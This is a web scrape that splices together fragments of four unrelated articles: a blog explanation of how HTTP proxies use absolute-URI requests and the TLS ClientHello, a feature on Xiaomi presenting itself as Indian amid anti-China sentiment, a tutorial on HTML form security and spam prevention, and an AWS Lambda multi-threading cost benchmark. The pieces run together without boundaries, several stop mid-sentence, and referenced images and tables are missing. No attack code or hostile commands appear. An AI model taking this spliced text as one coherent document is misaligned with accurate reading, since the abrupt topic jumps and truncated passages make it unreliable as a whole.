want to create the diagrams again.</p><p>The browser establishes a TCP connection to the proxy (the famous <code>SYN-SYNACK-ACK</code>) and then sends the GET request.</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/01.png" title="What does the proxy see?" alt="What does the proxy see?">

<span>GET request sent to the proxy</span></span></p><p>Now, we (proxy) must decide where to send this GET request. Note that both the proxy (Burp) and the browser are on the same machine so the source and destination IP addresses in the previous picture are both <code>127.0.0.1</code>. So we cannot forward the request based on the destination IP address.</p><p>How is this GET request different from a non-proxied GET request?

<span>GET request without using a proxy</span></span></p><p>Check the highlighted parts. The request sent to proxy has the <code>absoluteURI</code>. In simple words it has the complete URI (or URL) in the GET request. The proxy uses this to discover the endpoint. This was initially discussed in RFC2616 which discusses HTTP/1.1. In <a href="https://tools.ietf.org/html/rfc2616#section-5.1.2" target="_blank">section 5.1.2. Request-URI</a>, we see:</p><blockquote><p>The absoluteURI form is REQUIRED when the request is being made to a proxy.<br>...<br>An example Request-Line would be:<br>GET <a href="http://www.w3.org/pub/WWW/TheProject.html" target="_blank">http://www.w3.org/pub/WWW/TheProject.html</a> HTTP/1.1</p></blockquote><p>In newer RFCs you can look it up using <code>absolute-URI</code>. This format is called <code>absolute-form</code>. In <a href="https://tools.ietf.org/html/rfc7230" target="_blank">RFC7230 - HTTP/1.1: Message Syntax and Routing</a> we can check <a href="https://tools.ietf.org/html/rfc7230#section-5.3.2" target="_blank">section 5.3.2. absolute-form</a> to see:</p><blockquote><p>When making a request to a proxy, other than a CONNECT or server-wide OPTIONS request (as detailed below), a client MUST send the target URI in absolute-form as the request-target.</p><p>absolute-form = absolute-URI</p></blockquote><p>Note that the RFC instructs clients to send the <code>absolute-URI</code> no matter what (even if they are using a <code>CONNEC</code> request) as we will see shortly.</p><p>The proxy uses this <code>absolute-URI</code> to forward the request to the endpoint (in this case Yahoo!). Both forwarding and TLS terminating proxies work similarly in this case because they both can look inside HTTP payloads.</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/04.png" title="HTTP proxy in action" alt="HTTP proxy in action">

That is a very good question and it was mine too. We are the proxy and we see the <code>Host</code> header, why do we need to use the absolute-URI instead?</p><p>The answer is backward compatibility with HTTP/1.0 proxies. This is hinted in <a href="https://tools.ietf.org/html/rfc7230#section-5.4" target="_blank">section 5.4. Host</a> of RFC7230:</p><blockquote><p>A client MUST send a Host header field in an HTTP/1.1 request even if the request-target is in the absolute-form, since this allows the Host information to be forwarded through ancient HTTP/1.0 proxies that might not have implemented Host.</p></blockquote><p>Later it instructs proxies to rely on the absolute-URI and ignore the <code>Host</code> header. If the <code>Host</code> header is different from the URI, then the proxy must generate the correct header and send it with the request.</p><h2 id="3-2-forwarding-proxy-and-https">3.2. Forwarding Proxy and HTTPs</h2><p>But what about HTTP(s) forwarding proxies? How do they work?</p><p>Again let's put ourselves in place of the forwarding proxy. We do not do TLS handshakes and just forward things around. After the user types <a href="https://www.google.com/" target="_blank">https://www.google.com</a> in their browser, it creates a TCP connection to us and then starts the TLS handshake. The first step of a TLS handshake is <code>ClientHello</code> discussed in <a href="https://tools.ietf.org/html/rfc5246#section-7.4.1.2" target="_blank">RFC5246 section 7.4.1.2.</a> (<a href="https://tools.ietf.org/html/rfc5246" target="_blank">RFC5246</a> is essentially TLS 1.2).</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/05.png" title="ClientHello sent from browser to proxy" alt="ClientHello sent from browser to proxy">
<span>ClientHello sent from browser to proxy</span></span></p><p>Now I did not read the TLS 1.2 RFC completely and I doubt you need to either.

<span>ClientHello as seen by proxy</span></span></p><p>But we are a proxy and we should know what it means. Tools should be able to do this for us. In this case I used Netmon and it decodes the <code>ClientHello</code> like this:</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/07.png" title="ClientHello deciphered" alt="ClientHello deciphered">
<span>ClientHello deciphered</span></span></p><p>Now, we need to decide where to send this <code>ClientHello</code>.

<p><span>T</span>he Indiranagar 100-Feet Road is the commercial heart of India’s technology capital Bangalore, lined with international brand stores, bars, restaurants, and food courts. Owning retail space here, alongside consumer giant Reliance Digital and German footwear brand Puma, is a marker of success for brands breaking into mainstream consciousness. Chinese smartphone maker Xiaomi’s two-story, 6,000-square-foot flagship store is right at the heart of the district. Behind its saffron frontage is a showcase for its as-yet-unlaunched handsets, televisions, laptops, fitness bands, e-scooters, and water purifiers.&nbsp;</p>



<p>In June, the store had a complete facelift. A new logo was put on the front of the building that read: “Made In India.” By August, the interior had been decorated with tricolored balloons in the green, white, and orange of the Indian flag. Along the walls, a company timeline showed the history of Xiaomi’s manufacturing operations in India. Mentions of the company’s heritage — it was founded in Beijing in 2010 — disappeared. <a href="https://www.indiatoday.in/india/story/xiaomi-puts-up-made-in-india-banner-outside-stores-to-counter-boycott-china-campaign-1692633-2020-06-25">Hundreds</a> of the company’s stores across the country underwent the same transformation. “Super proud to share that majority of our TVs are #MadeInIndia! We employ thousands of team members across our India factories #ProudIndian,” <a href="https://twitter.com/manukumarjain/status/1276052185638252544?s=20">tweeted</a> Manu Kumar Jain, the India head of Xiaomi.&nbsp;</p>



<p>Anti-China sentiment had already been rising in India’s heartlands before a skirmish in June in a disputed Himalayan border region left 20 Indian soldiers dead. Nationalists started <a href="https://www.thequint.com/news/india/bharat-mata-and-chinese-tvs-a-tale-of-boycotting-goods-from-china">smashing</a> Chinese-made televisions; one minister called for shutting down <a href="https://economictimes.indiatimes.com/news/politics-and-nation/restaurants-and-hotels-that-sell-chinese-food-should-be-shut-down-union-minister-ramdas-athawale/videoshow/76442910.cms">Chinese restaurants</a>. A few weeks after the skirmish, the Indian government banned TikTok, along with hundreds of Chinese apps, and, in August, passed an <a href="https://www.ft.com/content/55642551-f6e8-4f9d-b5ba-a12d2fc26ef9">unofficial</a> order to phase out dependence on Chinese telecom equipment, including 5G networks. Prime Minister Narendra Modi made a special appearance on television encouraging Indians to be <a href="https://www.youtube.com/watch?v=0xmx92Q_kQ4">“vocal” in their support for “local” products</a>, creating the #vocalforlocal slogan.&nbsp;</p>



<p>Chinese smartphone makers like Oppo, Vivo, and Xiaomi — who made up 81% of the Indian market — were left in a precarious position after the clash. Right-wing groups gathered outside Oppo’s factory in the outskirts of Delhi and <a href="https://www.newindianexpress.com/nation/2020/jun/20/anti-china-demonstration-held-outside-oppo-factory-in-greater-noida-32-protesters-booked-2159224.html">burnt effigies of Xi Jinping</a>, as they demanded that the plant be closed. Some companies battened down the hatches, <a href="https://economictimes.indiatimes.com/industry/cons-products/electronics/chinese-brands-endorsers-may-go-slow-on-promotions-some-pull-out-ads-some-plan-to-play-up-make-in-india-credentials/articleshow/76429828.cms?from=mdr">suspending their prime-time advertising campaigns</a>. Vivo <a href="https://sports.ndtv.com/cricket/ipl-title-sponsor-vivo-pulls-out-of-tournament-this-year-amid-row-2274036">pulled out</a> as the title sponsor of the country’s biggest sporting event, the Indian Premier League cricket competition, after an aggressive campaign against it on social media. Stray protests took place outside some Xiaomi stores, as threats of vandalism loomed large and mobile shipments from China were <a href="https://telecom.economictimes.indiatimes.com/news/smartphone-makers-in-panic-mode-over-stranded-shipments/76536342">stalled for manual inspection at Indian ports</a>.</p>



<p>But while other Chinese brands retreated from the limelight, Xiaomi pursued a unique — and potentially high-risk — strategy: It presented itself as not being Chinese after all, but Indian. Jain, its figurehead in India, took to television, newspapers, and social media to talk up the company’s all-Indian local leadership team and the thousands of jobs it had created in manufacturing and retail. “We are more Indian than anyone else,” Jain told <a href="https://twitter.com/manukumarjain/status/1274316181235568645?lang=en">CNBC-TV18</a>. The company even donated money to the families of soldiers “<a href="https://www.mi.com/in/service/support/crpffund.html">martyred</a>” in Kashmir.</p>



<p>Jain has proven adept in using social media and his own personal brand to launder Xiaomi’s origins. But the company faces growing pressure in an unstable political environment. Narendra Modi’s government is once again proclaiming its desire to bring manufacturing back to India, offering <a href="https://www.bloomberg.com/news/articles/2020-09-10/india-mulls-23-billion-package-to-lure-global-manufacturers?sref=QYWxDQ1o">lavish incentives</a> for export-led manufacturers, which may help once-moribund local phone brands. Xiaomi has indeed moved some of its production onshore, but the core components of its devices are still made in China. With the country’s nationalist surge unlikely to end soon, Jain and Xiaomi will eventually have to face up to the question: How Indian is Indian enough?</p>

<p><strong>Jain, 39, “is</strong> the Indian middle-class dream personified,” in the words of a former colleague. As a child, he lived in Meerut in northern India, alongside 150 members of his extended family, in an isolated housing compound inside a military quarters built by his great grandfather. “I had never even been exposed to the outside world,” Jain says.</p>



<p>After studying at the prestigious Indian Institute of Technology and at the Indian Institute of Management business school, he joined the global consulting firm McKinsey.</p>



<p>Jain’s early career in technology was successful but low profile. He quit McKinsey in 2012 to launch e-commerce portal Jabong.com, which was sold to SoftBank-backed (now Walmart-owned) rival Flipkart for $70 million in 2016. By then, Jain had already moved on to <a href="https://www.thehindubusinessline.com/companies/Jabong%E2%80%99s-former-MD-switches-attention-to-wearable-smart-devices/article20718785.ece#">start a short-lived wearables company</a>. In 2014, he became Xiaomi India’s first hire, recruited by Hugo Barra, the former Android executive who had been tasked with expanding Xiaomi outside China.</p>



<p>At the time, the market was dominated by Samsung and by Indian brands, such as Micromax, Karbonn, and Lava, whose model was to import unbranded Chinese products and sell them as their own. “There was no R&amp;D team, no product team, and no product design. They would basically just buy those products and sell them here,” says Jain.</p>



<p>Xiaomi’s entry was not just about cutting out the middleman. In China, Xiaomi, along with Oppo and Vivo, had evolved beyond their origins in cheap but unreliable products and were now designing and producing higher-quality but affordable devices that were well adapted to a market like India, where disposable income was increasing in step with demand for mobile data.</p>



<p>Jain began his tenure at Xiaomi with a big gamble. In 2014, only 6% of Indian retail sales happened through e-commerce, but Jain launched Xiaomi as an online-only brand, replicating an approach that had worked in China.&nbsp;</p>

<p>“Most people said, You are going to fail. You are going to be a disaster,” he said during a 2017 TED Talk. “Most smartphone brands until then focused on building large distribution networks, and we didn’t do that.”&nbsp;</p>



<p>To drum up interest, the company organized flash sales and made sure the phones sold out quickly, to enhance their perceived popularity, a technique known as “hunger marketing.” They spent relatively little on advertising, instead relying on their users to become evangelists for the brand.</p>



<p>Xiaomi’s phones seemed to hit a sweet spot of pricing and specifications. “Their phones were undercutting basically every other device on the market by half,” says Harish Jonalaggada, Asia editor at mobile review portal Android Central. The company launched phones for $180, with high specs like 64GB storage and 4GB RAM that were previously seen on only devices over $400.</p>



<p>The rush of orders for the launch of the Mi 3 model crashed the Indian e-commerce website Flipkart in the summer of 2014.&nbsp;</p>



<p>But Xiaomi’s success wasn’t just about its hardware. Under Jain’s leadership, the company tailored its Android-based operating system, MIUI, to the local market. One feature, Smart SMS, identifies the cluttered text messages that Indian Railways sends to its customers and extracts booking information, turning it into a ticket-like document. Xiaomi was the first company in India to incorporate a popular “dual app” feature that allows users to run duplicate versions of the same app — such as WhatsApp — on the same phone.</p>



<p>As online channels exploded in popularity and started to become saturated, Xiaomi shifted direction. In 2017, the company dramatically expanded its physical retail presence, pushing deep into rural areas. In October 2018, it set a mark recognized by the Guinness World Records by opening <a href="https://gadgets.ndtv.com/mobiles/news/xiaomi-opens-over-500-retail-stores-in-a-single-day-in-rural-india-1950375">500 stores</a> in a day. “One of the reasons Xiaomi has done well is — from both a product perspective and channel perspective — they made decisions unique to the India market,” says a Shanghai-based financial analyst covering Xiaomi who requested to remain anonymous, citing geopolitical tensions. In September, Xiaomi piloted its unique <a href="https://gadgets.ndtv.com/mobiles/news/xiaomi-mi-store-on-wheels-mobile-stores-moving-trucks-launch-india-villages-watch-xiaomi-2298745">Mi Store on Wheels</a>, a van that sells everything from trimmers to phones throughout the hinterlands of India.&nbsp;</p>



<p>This sensitivity to the local market is in no small part due to the unusual autonomy that Jain has had in running Xiaomi in India. The Indian operations of Oppo and Vivo are both run by Chinese nationals. “Chinese companies are often very inward-looking and wouldn’t devolve the power in the same way Xiaomi has,” the analyst says.</p>

<p>That unusual autonomy stems from the relationship that Jain has built with Lei Jun, Xiaomi’s founder and CEO, a self-confessed acolyte of Apple founder Steve Jobs. Jain says that, when he and Jun first met, “both of us were wearing black T-shirts and denim jeans. It was cool.”</p>



<p>One former employee, who worked closely with Jain while setting up the India operations, told <em>Rest of World</em>: “Over a period of time when Xiaomi India was growing, Manu was able to earn Jun’s trust, which is actually very hard. … Manu’s bets on the Indian market proved him right. And so, after a while, the CEO decided to just let Manu make his own decisions, which is very rare.”&nbsp;</p>



<p>By 2019, Xiaomi was the largest smartphone brand in India, shifting 100 million units, according to data from the International Data Corporation. The company has expanded beyond mobile and offers everything from luggage to beard trimmers. Its rise came at the cost of Indian brands, whose market share fell from close to 50% to just 13% by the end of 2018, according to market intelligence firm Counterpoint Research.&nbsp;</p>



<p>Jun and Jain share a love of the limelight. Jun is a <a href="https://www.nytimes.com/2013/06/05/business/global/in-china-an-empire-built-by-aping-apple.html">social media celebrity</a> in China, posting mobile teasers and specifications to his 5 million …</p></div></div>

If you have not read the others, I would encourage you to take a look.</p> <ul><li><a href="https://austingil.com/how-to-build-html-forms-right-semantics/">Part 1: Semantics</a></li><li><a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">Part 2: Accessibility</a></li><li><a href="https://austingil.com/build-html-forms-right-styling/">Part 3: Styling</a></li><li><a href="https://austingil.com/build-html-forms-right-user-experience/">Part 4: User Experience</a></li><li><strong>Part 5: Security</strong></li></ul> <p>This final article in the series is arguably the most important. It covers security. While the other articles were mainly focused on the frontend, security goes beyond that. We have to consider the current user, other users, and our own security. As such, we will look at the whole application architecture from frontend to backend and beyond.</p>  <h2><span id="Encrypt_Traffic_(SSL)"></span>Encrypt Traffic (SSL)<span></span></h2> <p>Before we get too far, I will be using the term “SSL” to refer to a technology used to encrypt traffic on the internet. Technically, I mean Transport Layer Security (TLS), but “SSL” is commonly used and understood to mean the same thing. It’s what gives websites the little green lock in the URL bar and why they start with “http<strong>s</strong>” instead of “http” (no “s”). </p> <p>Installing an SSL certificate is a best practice for several reason, security being the most important. Having an SSL certificate lets you encrypt the data passed between the client (your user) and the server (you). </p> <p>A hacker snooping on a network may inspect the packets of data a user sends. Without an SSL certificate, that data may be easily read as plain text. With an SSL certificate, the data can still be intercepted, but it would be sent as encrypted text which is pretty much useless.</p> <ul><li>Without an SSL certificate: username: <br><code>NuggetTheMighty; password: ILoveSquirrels</code></li><li>With an SSL certificate (encrypted): <br><code>SIUFJaYQNtsn+y73mfBYv3fVfjJ2GdHl4A7XnTJXxgUyd4/TrU3nN+g3aJ4BVXSJL/E7</code></li></ul> <p>This is especially important when creating forms because the whole point of a form is to send data. We owe it to our users to protect their data.</p> <p>Getting and installing an SSL certificate used to cost time, money, and some technical know-how. Today, many hosting services will provide and install a certificate for you for free. In many cases, they even do so automatically.</p> <p>If your hosting service does not provide SSL certificates, there are other options:</p> <ul><li><a href="https://www.cloudflare.com/" rel="noopener">Cloudflare</a> provides a “flexible” SSL through their DNS. It’s free and easy, but probably better to have your own.</li><li>If your site uses <a href="https://wordpress.org/" rel="noopener">WordPress</a>, there are a few <a href="https://wordpress.org/plugins/ssl-zen/" rel="noopener">plugins</a> that will set up a certificate in under a minute, via <a href="https://letsencrypt.org/" rel="noopener">Let’s Encrypt</a>.</li><li>You can use <a href="https://certbot.eff.org/" rel="noopener">Certbot</a> to generate and install a certificate for you via <a href="https://letsencrypt.org/" rel="noopener">Let’s Encrypt</a>.</li></ul> <p>If you still don’t have an SSL certificate because your host doesn’t provide one, and you don’t have control of the DNS or server code…well, you’re kind of out of luck. You’re going to have to switch hosts, or talk to your server admin, or do something because this should be a hard requirement for any project these days.</p> <h2><span id="Understand_GET_vs_POST"></span>Understand GET vs. POST<span></span></h2> <p>In <a href="https://austingil.com/how-to-build-html-forms-right-semantics/">a previous article</a>, I said you should always include the <code>method</code> attribute on your forms. The <code>method</code> attribute tells the form to submit data with the <code>GET</code> or <code>POST</code> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" rel="noopener">HTTP header</a> on the request. If you omit the <code>method</code>, the browser will default to using the <code>GET</code> method. This is important because there are significant differences between <code>GET</code> and <code>POST</code> requests.</p> <h3><span id="GET_Request"></span>GET Request<span></span></h3> <p>Take a look at the following form using a GET method. When you submit the form, the data will be submitted to example.com (spoiler alert, it doesn’t actually do anything).</p> <div data-prefill="" data-default-tab="html,result"> <pre data-lang="html">&lt;form action="https://example.com" method="GET" target="_blank"&gt;
  &lt;label for="data"&gt;Send some sweet data&lt;/label&gt;
  &lt;input id="data" name="some-sweet-data"/&gt;
  &lt;button&gt;Submit&lt;/button&gt;
&lt;/form&gt;</pre> </div> <p>The key thing to notice is the URL after you submit the form. Although the form’s <code>action</code> is “example.com”, the submission URL is “example.com?<strong>some-sweet-data</strong>=blahblahblah”. Those query parameters correspond to the form inputs name attributes. This is how forms using the <code>GET</code> method transfer data; query string parameters.</p> <p>Passing data as a URL parameter is relevant to security for a couple of reasons:</p> <ol><li>For many users, URL’s get saved in the browser’s history. Consider if form was sending a credit card number by query parameter, and the user was on a public computer, like at a library. Their private data could end up in the browser’s history for the next user to see.</li><li>Many servers keep logs of the URL’s that received traffic. If sensitive information ends up in server log files, anyone with access to those files could see the data.</li></ol> <h3><span id="POST_Request"></span>POST Request<span></span></h3> <p>Fortunately, you can use the <code>POST</code> method to send data without using query parameters. Let’s look at the same form, but using the <code>POST</code> method:</p> <div data-prefill="" data-default-tab="html,result"> <pre data-lang="html">&lt;form action="https://example.com" method="POST" target="_blank"&gt;
  &lt;label for="data"&gt;Send some sweet data&lt;/label&gt;
  &lt;input id="data" name="some-sweet-data"/&gt;
  &lt;button&gt;Submit&lt;/button&gt;
&lt;/form&gt;</pre> </div> <p>Notice how submitting this form also loads example.com, but this time there is nothing in the query parameters. That’s because on a <code>POST</code> request, data is sent as part of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Request" rel="noopener">request</a> body. This makes it more difficult to accidentally leak private information.</p> <p>As a rule of thumb, I use the <code>POST</code> method on all forms for the reasons listed above. The few exceptions to this rule, are if I want to let users bookmark their form submission, or share it with someone else. For example, check out this form that submits search to <a href="https://duckduckgo.com/" rel="noopener">DuckDuckGo</a>:</p> <div data-prefill="" data-default-tab="html,result"> <pre data-lang="html">&lt;form action="https://duckduckgo.com/" method="GET" target="_blank"&gt;
  &lt;label for="query"&gt;Search&lt;/label&gt;
  &lt;input id="query" name="q"/&gt;
  &lt;button&gt;Submit&lt;/button&gt;
&lt;/form&gt;</pre> </div> <p>After the form is submitted, DuckDuckGo will open with a query parameter in the URL. Then you could, if you wanted, copy this URL and share it with a colleague, or bookmark it for later. This pattern can very useful to keep it in mind unless you’re dealing with sensitive data.</p> <h2><span id="Prevent_Spam"></span>Prevent Spam<span></span></h2> <p>No one likes spam. And I’ll admit it’s only marginally related to security. It’s worth mentioning here because any time we add a form to a public web page, we are opening up the doors to spam. Forms are meant to be filled out, but sometimes they get filled out by someone, or some<strong>thing</strong>, for nefarious reasons.</p> <p>So how do we prevent it?</p> <h3><span id="Honeypots"></span>Honeypots<span></span></h3> <p>One rudimentary way of preventing spam is called a “<a href="https://en.wikipedia.org/wiki/Honeypot_(computing)" rel="noopener">honeypot</a>” and the concept is quite simple. If you include a hidden input in your form, you know that a real human should never modify that field. Therefore, if the form is submitted with data for that input, you can assume it was a bot and reject the submission.</p> <p>In practice, here’s what that input might look like:</p> <pre>&lt;input name="honeypot" class="visually-hidden" tabindex="-1" autocomplete="off"&gt;</pre> <ul><li>The <code>name</code> is important so you know what to check on the backend. I used ‘honeypot’, but most folks would recommend calling it something that sounds more legitimate.</li><li>I used a <code>visually-hidden</code> class to hide the input from users (you can read more about this in the article on <a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">accessibility</a> or <a href="https://austingil.com/build-html-forms-right-styling/">styling</a>). Bots will still see it.</li><li>The <code>tabindex="-1"</code> removes the input from keyboard navigation. This is important for assistive technology users (more on this in the <a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">accessibility post</a>).</li><li>Finally, we want to prevent the browser form filling the input automatically, so we disable <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete" rel="noopener"><code>autocomplete</code></a>.</li></ul> <p>The good news about this approach is that it can cost very little time and effort to implement. The bad news is that many bots are smart enough to tell when an input is a honeypot and they will skip over it. But hey, even if this stops 10% of spam, the level of effort is worth it.</p> <h3><span id="Security_Challenge"></span>Security Challenge<span></span></h3> <p>A more robust way of preventing spam is to include a challenge that users need to complete to prove they are human. Some basic examples are inputs that ask you to complete an easy math question like “What is 10 + 6?”. Only data with the correct answer will be accepted.</p> <p>The problem with this method is that, once again, bots can be sophisticated enough to solve these challenges.</p> <p>The spam dilemma is a constantly evolving game of cat and mouse that has seen challenges become more complex through time. First math questions, then detecting letters or numbers in images.</p> <p>Probably the most familiar security challenge is <a href="https://developers.google.com/recaptcha/" rel="noopener">reCAPTCHA</a>. It’s a service now owned by Google that shows users a bunch of images they need to identify. It works very well, and it’s free. If you are concerned about user-privacy, you may not want to use Google products. The good news is that there is another service called <a href="https://www.hcaptcha.com/" rel="noopener">hCaptcha</a> which is a drop-in replacement. The security challenge technique is not without downsides:</p> <ul><li>They are more technical to implement.</li><li>You may need to rely on a 3rd party service.</li><li>They can have a negative impact on <a href="https://austingil.com/build-html-forms-right-user-experience/">user experience</a>.</li></ul> <h3><span id="WAF_APIs"></span>WAF &amp; APIs<span></span></h3> <p>If spam is becoming a major issue in your forms, you may want to consider reaching for a 3rd party service.</p> <p>One option is to set up a <a href="https://en.wikipedia.org/wiki/Web_application_firewall" rel="noopener">Web Application Firewall (WAF)</a>. A WAF sits in front of your server and prevents traffic from bad actors getting to your website in the first place.</p> <p><a href="https://www.cloudflare.com/" rel="noopener">Cloudflare</a> is my preferred vendor. They work at the DNS level and have a very generous free tier. I use this on every domain I own, and so far I haven’t had any problem with spam.</p> <p>Another option is to use an API service to test incoming form submissions. The most common one I know is <a href="https://akismet.com/development/api/" rel="noopener">Akismet</a> which is part of the <a href="https://automattic.com/" rel="noopener">Automattic</a> products (they make <a href="https://wordpress.org/" rel="noopener">WordPress</a>). I’ve used this on some WordPress sites and can say that it works well. They also have an API if you don’t use WordPress. CSS Tricks has <a href="https://css-tricks.com/spam-detection-apis/" rel="noopener">an article</a> that goes into more depth on 3rd party spam APIs if you’re interested in other options.</p> <p>I wouldn’t trust any spam prevention technique to be 100% guaranteed. The field is ever-evolving with spammers getting more advanced every year. However, it’s also not the sort of problem I would try to solve until I have it. In which case, you can start with some of the low-hanging fruit and work your way up to a more involved solution.</p> <p>Considering the level of effort, user experience, cost, and everything else, I would approach things like this:</p> <ol><li>Setup Cloudflare on your DNS (or some …</li></ol></div></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!--## AWS re:Invent 2020 Day 3: Optimizing Lambda Cost with Multi-Threading-->
<p>Amazon has released support for up to 10 GB memory and 6 vCPUs for your Lambda functions. In this article we will explore how these new memory configuration options can drive down costs and execution times for compatible workloads.</p>
<p>Let’s quickly review the Lambda pricing scheme. We’ll ignore the free tier. Lambda is billed at $0.0000166667 for every GB-second. A GB-second is the unit of measurement for 1 GB of memory running for 1 second. Lambdas are often very short lived, so let’s say a particular function has an average execution time of 100ms, and is executed 100 times every minute. That’s 10 seconds of execution time per minute, 14.400 seconds per day, and 432.000 seconds per 30 days. This function is configured to use 128 MB or RAM (1/8th of a GB), so you’re billed for 432.000 / 8 = 54.000 GB-seconds per month. At $0.0000166667 per GB-second, this function will cost a whopping $0.90 per month.</p>
<p>The only tunable performance configuration for Lambda is the amount of memory available to the function. The CPU performance scales with the memory configuration. Lambda functions used to always have 2 vCPU cores, regardless of memory. These cores would be throttled at certain memory configurations. The <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/lambda/latest/dg/configuration-memory.html">documentation</a> states that at 1,769 MB, a function has the equivalent of one vCPU.</p>
<p>With the increased maximum memory of 10GB, up from 3008 MB (<a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-supports-10gb-memory-6-vcpu-cores-lambda-functions/">AWS News</a> - <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/new-for-aws-lambda-functions-with-up-to-10-gb-of-memory-and-6-vcpus/">AWS Blog</a>), the number of CPUs has become more flexible. We ran some tests and found out that Lambda now has the following CPU tiers:</p>
<table>
<thead>
<tr>
<th>Memory</th>
<th>vCPUs</th>
</tr>
</thead>
<tbody>
<tr>
<td>128 - 3008 MB</td>
<td>2</td>
</tr>
<tr>
<td>3009 - 5307 MB</td>
<td>3</td>
</tr>
<tr>
<td>5308 - 7076 MB</td>
<td>4</td>
</tr>
<tr>
<td>7077 - 8845 MB</td>
<td>5</td>
</tr>
<tr>
<td>8846+ MB</td>
<td>6</td>
</tr>
</tbody>
</table>
<p>This opens up a number of new price tuning options. If a workload supports multi-threading, for example, we can try to optimize the number of vCPUs to reduce execution time. A multi-threading function configured at 3009 MB might execute 1.5x as fast as a 3008 MB function, a 33.3% cost reduction! Let’s see if we can produce these results in real life benchmarks.</p>
<h3>Running tests with ffmpeg</h3>
<p>To test Lambda’s performance we compiled <code>ffmpeg</code> from source and packaged it together with a 100 MB sample video and a simple Python app. Because this package exceeds the maximum size for Lambda deployment packages, we used the new Lambda  Container Image Support (<a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-lambda-now-supports-container-images-as-a-packaging-format/">AWS News</a> - <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/new-for-aws-lambda-container-image-support">AWS Blog</a>) to put <code>ffmpeg</code> and the video together in a container and create a Lambda function from that container. Our performance benchmark will consist of 100 iterations of a video format conversion. The exact command for our initial run of benchmarks is <code>ffmpeg -i source.mkv -c:v libx264 -b:a 128k -threads 1 -y /tmp/target.mp4</code></p>
<p>As you can see, this command is hardcoded to use only one thread. This allows us to set a single-threaded baseline on various memory configurations. We ran 100 iterations on the key memory sizes in the table below. The values chosen are the top and bottom values for every CPU tier. 832 MB was the minimum required to successfully convert the video within 15 minutes.</p>

<p>This data clearly shows that any memory configuration above 3008 MB does not improve single thread performance. Memory configurations up to 1769 MB are throttled, from 1769 MB to 3008 MB there are some minor performance increases, and from 3008 MB and up you’re using the full capacity of a single core, which means the average execution time plateaus. At the same time the costs for higher memory configurations are skyrocketing. Clearly, if you’re running single-threaded processes in Lambda you would do well to fit your Lambda’s memory closely to your function’s actual requirements.</p>
<h3>Multi-threaded results</h3>
<p>For our multi-threaded tests, we obtain the number of CPUs from <code>/proc/cpuinfo</code> and configure <code>ffmpeg</code> to use as many threads as there are cores. Let’s take a look at the results.</p>

<p>What jumps out immediately is that at 832 MB using two threads is actually slower than the single-threaded benchmark. This likely relates to the CPU throttling applied to Lambda functions below 1769 MB: two threads competing for the same limited resources are slower than a single thread having those resources to itself.</p>
<p>At 1769 MB the multi-threaded measurement is almost exactly equal to the single-threaded result. This makes sense, since the documentation states that at 1769 MB, a function has the equivalent of one vCPU. At this level contestation is apparently no longer an issue.</p>
<p>At 3008 MB, the old maximum memory configuration, we start to benefit from using multiple cores. But it starts to get interesting at exactly 1 MB higher, at 3009 MB. This is the first time we get to use more than two cores, and we would expect an immediate performance bump. However, the results at three cores and 3009 MB are only 1.73% better than at two cores and 3008 MB. Apparently, the three cores at 3009 MB do not offer 1.5x the performance of the two cores at 3008 MB, and some throttling is taking place. This is corroborated by the benchmark at 5307 MB: even though this configuration has the same amount of cores, its performance is 28.96% higher than at 3009 MB. This means that AWS is dynamically limiting the amount of processing power available to the function, based on its memory configuration.</p>
<p>Next, at 5308 MB, we have our first four-core benchmark. Here we see that the fourth core adds a significant improvement. Although we added only 0.0188% of memory, performance jumped by 10.65%. The other four-core measurement at 7076 MB yields further improvements, but not enough to offset the additional cost.</p>
<p>Then at 7077 MB, the first five-core benchmark, we see another BIG jump. Again, we only added a single MB of memory, but the fifth core increased performance by an incredible 26.56%. Increasing memory to 8845 MB adds another improvement of 8.64%, but like in the four-core block, this doesn’t offset the additional cost.</p>
<p>At 8846 MB the additional MB and 6th core yields a 5.52% performance boost, and the maximum configuration of 10240 MB is 2.87% faster than the 8846 MB setting.</p>
<h3>Understanding these results</h3>
<p>The single-threaded benchmarks showed that a single core maxes out at relatively low memory configurations. The same logic doesn’t apply to multi-threaded solutions: every tier increased multi-threaded performance. Adding an additional core sometimes adds a big performance gain, and sometimes it hardly adds value.</p>
<p>This leads me to conclude that AWS applies a sort of dynamic capacity ceiling to Lambda functions. For example, this ceiling might be set at 0.5 at 832 MB, which means you can at max use half a core. It’s set to 1.0 at 1769 MB, which means we can use one full core. At 3008 it seems to be set to 1.6667. A full list of ceiling values can be found in the table below:</p>

<p>This explains how single-threaded functions can completely utilize a single core, but multi-threaded applications can’t do the same on multiple cores.</p>
<p>Please note that these values are for my specific video conversion benchmark. This benchmark might not be able to max out all the cores available to it. Other benchmarks might be able to use multiple cores more efficiently and produce different results.</p>
<p>The core take-away is that this benchmark has run exactly the same process under different memory configurations, and consistently produces better results for higher memory configurations in the same CPU tier.</p>
<p>The second finding is that adding an additional core always yields a performance benefit for multi-threaded processes. Some cores (the third and sixth) provide smaller benefits than others (the fourth and fifth). If your function is configured just below one of these thresholds, slightly increasing the value might result in big gains.</p>
<h3>Determining the ideal price point</h3>
<p>Multi-threaded Lambda functions complete faster at higher memory settings, leading to lower costs. In general, the lower execution time offsets a big chunk of the higher memory costs. This is especially visible at 1769, 3009 and 7077 MB: the first configuration costs $1.1602 for 100 executions. The second configuration completes its operation 41.05% faster, at a 0.28% price increase ($1.1635). The 7077 MB setting completes 74.11% faster than the 1769 MB variant, at a 3.57% price increase ($1.2016).</p>
